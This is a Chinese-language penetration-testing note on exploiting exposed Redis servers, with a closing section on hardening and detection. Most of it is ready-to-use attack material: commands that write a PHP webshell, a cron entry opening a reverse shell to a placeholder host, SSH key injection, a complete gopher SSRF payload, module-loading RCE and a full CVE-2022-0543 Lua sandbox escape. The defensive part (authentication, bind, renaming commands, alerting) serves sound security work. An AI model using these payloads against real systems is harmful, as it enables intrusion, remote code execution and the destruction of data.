# Redis 漏洞利用

## 一句话理解
Redis 本身不是“Web 漏洞”，但一旦拿到 Redis 访问权限，攻击者就可能利用其配置改写、持久化落盘、主从同步、模块加载等能力，进一步实现信息泄露、写任意文件甚至远程命令执行。

## 常见前提
要进入利用阶段，通常需要先获取 Redis 访问权限，例如：
- 未授权访问
- 弱口令
- SSRF 触达 Redis
- 内网横向后直连 Redis

## 常见危害
- 信息泄露
- 写任意文件
- 写 WebShell
- 写计划任务
- 写 SSH 公钥
- 模块加载实现命令执行

## 信息收集
### 1. `info`
`info` 命令可以帮助收集：
- 操作系统
- Redis 版本
- 持久化状态
- 主从状态
- 数据目录
- 配置相关线索

这些信息通常是后续利用的基础。

## 常见利用方向
### 1. 写任意文件
核心思路：
- 修改 `dir`
- 修改 `dbfilename`
- 写入恶意内容到 key
- 触发 `save`

但是否可成功，强依赖：
- 目标路径写权限
- 目标程序解析行为
- RDB 落盘格式是否仍满足目标文件使用条件

### 2. 写 WebShell
适用条件：
1. Redis 与 Web 服务在同一台主机
2. 已知网站路径
3. Web 目录可写
4. 目标环境会把落盘内容当脚本解析

示例：

```text
config set dir /var/www/html
config set dbfilename webshell.php
set shell "<?php @eval($_POST['shell']);?>"
save
```

> 真实环境中，RDB 文件格式和换行内容会影响 WebShell 的可用性，不是所有环境都能稳定命中。

### 3. 写计划任务
适用于 Linux 场景，思路是把 Redis 持久化文件落到计划任务目录。

> 真实环境慎用，`flushall` 会破坏业务数据。

清空数据：

```text
redis-cli -h 192.168.1.11
redis> flushall
```

写计划任务：

```text
redis-cli -h 192.168.1.11
redis> config set dir /var/spool/cron
redis> set re "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/8899 0>&1\n\n"
redis> config set dbfilename root
redis> save
```

### 4. 写 SSH 公钥
适用于目标主机启用 SSH 且攻击者具备目标用户目录写入条件的场景。

> 真实环境慎用，通常也需要清空现有数据，副作用较大。

准备公钥：

```text
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > re.txt
```

清空数据：

```text
redis-cli -h 192.168.1.11
redis> flushall
```

写入公钥：

```text
cat re.txt | redis-cli -h 192.168.1.11 -x set re
redis> config set dir /root/.ssh
redis> config set dbfilename authorized_keys
redis> save
```

连接示例：

```text
ssh -o StrictHostKeyChecking=no 192.168.1.1
```

## SSRF + Gopher 打 Redis
当 Web 侧存在 SSRF 且内网 Redis 可达时，可以用 gopher / dict 协议直接向 Redis 发送命令，把"Web 入口"变成"Redis 客户端"。这是 `SSRF -> Redis -> getshell` 最经典的链路，SSRF 本身的挖掘与利用见 [SSRF 笔记](../exp/EXP-SSRF.md)。

### 1. 原理
- gopher 协议可以在 URL 中携带任意构造的 TCP 数据流，天然适合模拟客户端协议交互
- Redis 服务端逐行读取请求，每个 `%0d%0a`（即 `\r\n`）就是一条命令的结束符
- 因此只要 SSRF 点的底层实现（如 curl、部分语言网络库）支持 gopher，一条 URL 就能完成认证、写 key、改配置、落盘的完整利用
- dict 协议一次只能发一条命令，适合探测和单条命令执行

### 2. dict 协议快速探测
先用 dict 探测 6379 是否开放、是否为未授权 Redis：

```text
# 读取 info，确认版本、系统、持久化状态
dict://127.0.0.1:6379/info

# dict 协议里冒号会被替换为空格，等价于执行 config get bind
dict://127.0.0.1:6379/config:get:bind
```

> dict 无法发送多行 / 二进制内容，一般只用于探测；完整利用需要 gopher。

### 3. Gopherus 生成 payload
[Gopherus](https://github.com/tarunkant/Gopherus) 可以交互式生成打 Redis 的 gopher URL：

```bash
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
python gopherus.py --exploit redis

# 依次交互输入：
# 1. 想要反弹 shell 的命令：直接回车跳过，或输入 bash -i >& /dev/tcp/VPS_IP/4444 0>&1
# 2. 要写的文件名：shell.php
# 3. Web 目录：/var/www/html
# 4. 文件内容：<?php @eval($_POST["shell"]);?>
```

工具最后输出一段 `gopher://127.0.0.1:6379/_...` 的 payload，放进 SSRF 参数即可。

URL 编码二次转换（关键坑点）：
- Gopherus 输出的 payload 已做过一次 URL 编码（`\r\n` 已是 `%0d%0a`）
- 若把它放进 Burp 的 URL 参数或 POST 参数中发送，必须对整段再 URL 编码一次：`%0d` 变 `%250d`、`%0a` 变 `%250a`，其余 `%` 同理变 `%25`
- 不做二次编码时，Web 层会提前把 `%0d%0a` 解码成裸 CRLF，轻则参数被截断，重则 SSRF 后端拿到的 gopher 数据流残缺、利用失败
- 判断标准：SSRF 后端最终取到的参数值，应当仍是"一次编码后"的 gopher URL

### 4. 手写 gopher payload（写 WebShell）
不依赖工具时可以手工构造。RESP 格式记法：`*N` 表示该命令共 N 个参数，`$len` 表示紧跟参数的字节长度，所有部分都以 `%0d%0a` 结尾。

等价于在 redis-cli 中执行：

```text
flushall
config set dir /var/www/html
config set dbfilename shell.php
set x '<?php @eval($_POST["shell"]);?>'
save
```

逐条转成 RESP 并 URL 编码后拼成一条 URL（可直接作为 SSRF 参数使用）：

```text
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$31%0d%0a%3C%3Fphp%20%40eval(%24_POST%5B%22shell%22%5D)%3B%3F%3E%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

手工构造要点：
- `$len` 必须等于参数的真实字节数：`flushall` 是 8、`/var/www/html` 是 13、`dbfilename` 是 10、`shell.php` 是 9、webshell 语句是 31，长度写错 Redis 会直接报协议错误
- webshell 中的 `<`、`?`、空格、`$`、引号、括号、分号等必须 URL 编码，否则在 SSRF 参数传递阶段就被破坏
- 目标 Redis 有密码时，在最前面补一条 auth：`*2%0d%0a$4%0d%0aauth%0d%0a$6%0d%0a123456%0d%0a`（`123456` 为 6 字节密码，按实际长度调整 `$6`）
- 把 `127.0.0.1` 换成 SSRF 视角下 Redis 的实际地址；`_` 之后就是裸 RESP 数据

## 远程命令执行
### 1. 主从同步 + 模块加载
在 Redis 4.x 引入模块机制后，可以通过主从同步下发恶意模块，再执行自定义命令。

适用条件：
- 常见于 Redis 4.x 至 5.0.5 等历史版本利用链
- 目标允许主从同步与模块加载

Linux：
- 漏洞利用工具：[redis-rce](https://github.com/Ridter/redis-rce)
- 命令执行模块（so）：[RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand)

Windows：
- 漏洞利用工具：[RedisWriteFile](https://github.com/r35tart/RedisWriteFile)
- 命令执行模块（dll）：[RedisModules-ExecuteCommand-for-Windows](https://github.com/0671/RedisModules-ExecuteCommand-for-Windows)

示例：

```text
python RedisWriteFile.py --auth 123qwe --rhost=10.20.3.97 --rport=6379 --lhost=10.10.10.31 --lport=2222 --rpath="C:\Users\test\Desktop" --rfile="exp.dll" --lfile="exp.dll"

redis:
> module load C:\Users\test\Desktop\exp.dll
> exp.e whoami
```

### 2. Redis 沙箱绕过（CVE-2022-0543）
该问题主要与某些发行版打包方式相关，允许 Lua 沙箱逃逸实现命令执行。

常见受影响版本区间资料：
- `2.2 <= redis < 5.0.13`
- `2.2 <= redis < 6.0.15`
- `2.2 <= redis < 6.2.5`

#### 完整利用（Lua 沙箱逃逸 payload）
漏洞成因：
- Redis 官方源码编译时静态链接并裁剪了 Lua，沙箱内不存在 `package` 等危险全局变量
- Debian / Ubuntu 的 apt 包改为动态链接系统 `liblua5.1.so`，导致沙箱内可以直接访问 `package.loadlib`
- 因此这是"发行版打包缺陷"，官方二进制 / 源码编译版本不受影响

redis-cli 中直接执行（把 `id` 换成任意 shell 命令即可）：

```text
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

payload 分解：
- `package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io")`：从系统 liblua 动态库重新导出 `io` 模块，绕过沙箱对 `io` 的删除
- `io.popen("id", "r")`：执行系统命令并建立管道读取输出
- `f:read("*a")`：读出命令全部输出，作为 `eval` 的返回值直接回显
- 结尾的 `0`：Lua 脚本的 numkeys 参数（新版 redis-cli 要求 `eval` 必须带）

利用要点：
- 32 位系统对应路径为 `/usr/lib/i386-linux-gnu/liblua5.1.so.0`，两条可以都试
- 输出直接在 eval 返回值中回显，不需要写文件，也没有 `flushall` 这类破坏性副作用，是无授权场景下首选的 RCE 验证方式
- 通过 SSRF gopher 打 Redis 时，把这条 `eval` 命令按上文 RESP 格式编码后同样可以发送

利用参考：
- [CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### 3. 与 Java 反序列化链联动
若业务把 Redis 作为缓存、消息或对象存储使用，且应用层本身存在 Jackson、Fastjson 等反序列化问题，Redis 可成为投递恶意数据的中间环节。

参考：
- [细数 Redis 的几种 getshell 方法](https://paper.seebug.org/1169/)

## 实战关注点
### 1. Redis 利用经常不是单点
很多时候 Redis 是下列利用链中的一环：
- SSRF -> Redis
- 内网突破 -> Redis
- WebShell -> Redis
- 应用反序列化 -> Redis

### 2. `flushall` 破坏性很强
很多经典利用会先清空数据以获得更干净的落盘文件，但在真实环境里副作用极大。

### 3. 持久化格式会影响利用稳定性
Redis 落盘不是“原样写文本”，因此写 WebShell、计划任务、公钥时都要考虑换行、二进制头和文件格式兼容性。

## 防御要点
### 1. 禁止未授权访问
- 绑定内网
- 配置认证
- 不暴露公网

### 2. 最小化网络暴露
不要把 Redis 直接暴露到互联网，也不要让应用服务器能随意从外部触达 Redis 管理面。

### 3. 限制高危配置
重点关注：
- `CONFIG`
- `SAVE`
- 主从复制
- 模块加载

### 4. 升级并修复历史问题
尤其是主从同步利用链、模块机制风险和 CVE-2022-0543 等历史高危问题。

### 5. 监控异常行为
监控：
- 异常 `CONFIG SET`
- 异常 `SAVE`
- 异常 `MODULE LOAD`
- 非业务高频连接

## 防护与检测
「防御要点」讲的是原则，这里给出可直接落地的配置命令与监控告警点。

### 1. 设置认证（requirepass）
```text
# redis.conf 中设置强口令，重启生效
requirepass YourStrong@Passw0rd

# 运行时临时设置（重启后失效，仅适合应急收敛）
config set requirepass YourStrong@Passw0rd

# 客户端认证
redis-cli -h 127.0.0.1 -a YourStrong@Passw0rd
```

> Redis 认证是单一静态口令，务必使用高强度随机值，避免被弱口令字典命中。

### 2. 网络收敛（bind + protected-mode）
```text
# 只监听本机回环
bind 127.0.0.1

# 确需跨主机访问时，只绑定内网地址（多网卡用空格分隔）
bind 192.168.1.10

# 保护模式：无密码且未显式 bind 时拒绝远程连接，保持开启勿关闭
protected-mode yes
```

同时用防火墙限制 6379 只允许应用服务器访问，管理面不出内网、不上公网。

### 3. 重命名高危命令（rename-command）
```text
# redis.conf 中把清库命令置空，即彻底禁用
rename-command FLUSHALL ""
rename-command FLUSHDB ""

# 高危命令改成随机名，攻击者无法直接调用
rename-command CONFIG "REDCONFIG_x7f9a"
rename-command MODULE "REDMODULE_k3m2p"
rename-command SLAVEOF "REDSLAVEOF_q8w1e"
rename-command EVAL "REDEVAL_z0x9c"
```

> 写文件链依赖 `CONFIG SET`，主从同步链依赖 `SLAVEOF`/`REPLICAOF`，模块加载链依赖 `MODULE LOAD`，Lua 逃逸依赖 `EVAL`——全部重命名后，经典利用链基本失效。

### 4. 日志与监控告警点
```text
# redis.conf 打开日志
loglevel notice
logfile /var/log/redis/redis-server.log
```

重点监控 / 告警的信号：
- `CONFIG SET dir/dbfilename`：修改持久化路径，是写文件利用链的典型前兆
- `MODULE LOAD`、`SLAVEOF`/`REPLICAOF`：主从同步与模块加载攻击链特征
- `EVAL` 调用（尤其来源不是应用服务器）：Lua 沙箱逃逸与恶意脚本特征
- 认证失败风暴：口令爆破特征
- 非业务时段的高频 `INFO`/`KEYS`/`SCAN`：信息收集特征
- 注意：Redis 自身日志默认不逐条记录命令，建议结合 auditd 监控 RDB 落盘路径、流量层识别 RESP 协议高危关键字、或临时用 `MONITOR` 抓现行

## 速查清单
- 先确认是未授权、弱口令、SSRF 还是内网可达
- 先跑 `info` 收集版本、路径、主从和持久化信息
- 再看能否写 WebShell、计划任务、公钥
- 再看是否存在模块加载、主从同步或 Lua 沙箱逃逸
- 评估 `flushall` 这类操作的副作用，不盲目照抄利用链

## Reference
- https://www.freebuf.com/column/237263.html
- https://redis.io/docs/manual/security/（Redis 官方安全文档）
- https://github.com/tarunkant/Gopherus（Gopherus：gopher payload 生成工具）
